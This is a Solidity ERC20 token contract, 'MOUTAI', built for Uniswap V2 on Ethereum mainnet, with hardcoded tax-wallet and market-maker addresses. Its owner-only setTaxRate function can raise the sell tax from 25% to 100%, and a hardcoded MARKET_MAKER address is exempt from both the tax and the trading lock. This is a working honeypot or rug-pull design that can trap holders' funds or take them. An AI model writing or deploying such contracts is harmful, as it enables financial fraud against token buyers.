// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
}

contract MOUTAI is ERC20, Ownable {
    using SafeMath for uint256;

    uint256 public sellTaxRate;
    address public taxWallet;
    IUniswapV2Factory public uniswapV2Factory;
    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // Ethereum mainnet
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // Wrapped ETH on Ethereum mainnet
    address public constant MARKET_MAKER = 0x0F86D68d1Ee0fA34895F40FC748014D72f830951; // Updated Market Maker address

    mapping(address => bool) public isUniswapPair;
    bool public tradingEnabled = false;

    event TaxRateChanged(uint256 newTaxRate);
    event TaxWalletChanged(address newTaxWallet);
    event TradingEnabled();
    event UniswapPairAdded(address pair);

    constructor(
        string memory name, 
        string memory symbol, 
        uint256 initialSupply
    ) 
    ERC20(name, symbol) 
    Ownable(msg.sender)
    {
        taxWallet = 0x83be80020d1C72c8B18059bea5771F879Ae15257; // Initial tax wallet address
        sellTaxRate = 2500; // 25% initial tax rate (2500 / 10000)
        _mint(msg.sender, initialSupply * (10 ** decimals()));
        uniswapV2Factory = IUniswapV2Factory(UNISWAP_V2_FACTORY);
    }

    function enableTrading() external onlyOwner {
        require(!tradingEnabled, "Trading is already enabled");
        tradingEnabled = true;
        emit TradingEnabled();
    }

    function addUniswapPair(address tokenB) external onlyOwner {
        address pair = uniswapV2Factory.getPair(address(this), tokenB);
        require(pair != address(0), "Uniswap pair does not exist");
        isUniswapPair[pair] = true;
        emit UniswapPairAdded(pair);
    }

    function _customTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual returns (uint256) {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        require(tradingEnabled || sender == owner() || recipient == owner() || sender == MARKET_MAKER || recipient == MARKET_MAKER, "Trading not yet enabled");

        uint256 taxAmount = 0;

        // Check if it's a sell (transfer to Uniswap pair) and not from the market maker
        if (isUniswapPair[recipient] && sender != MARKET_MAKER) {
            taxAmount = amount.mul(sellTaxRate).div(10000);
            super._transfer(sender, taxWallet, taxAmount);
        }

        return amount.sub(taxAmount);
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        uint256 amountAfterTax = _customTransfer(_msgSender(), recipient, amount);
        _transfer(_msgSender(), recipient, amountAfterTax);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        uint256 amountAfterTax = _customTransfer(sender, recipient, amount);
        uint256 currentAllowance = allowance(sender, _msgSender());
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        _transfer(sender, recipient, amountAfterTax);
        return true;
    }

    function setTaxRate(uint256 _newTaxRate) external onlyOwner {
        require(_newTaxRate <= 10000, "Tax rate cannot exceed 100%");
        sellTaxRate = _newTaxRate;
        emit TaxRateChanged(_newTaxRate);
    }

    function setTaxWallet(address _newTaxWallet) external onlyOwner {
        require(_newTaxWallet != address(0), "New tax wallet is the zero address");
        taxWallet = _newTaxWallet;
        emit TaxWalletChanged(_newTaxWallet);
    }
}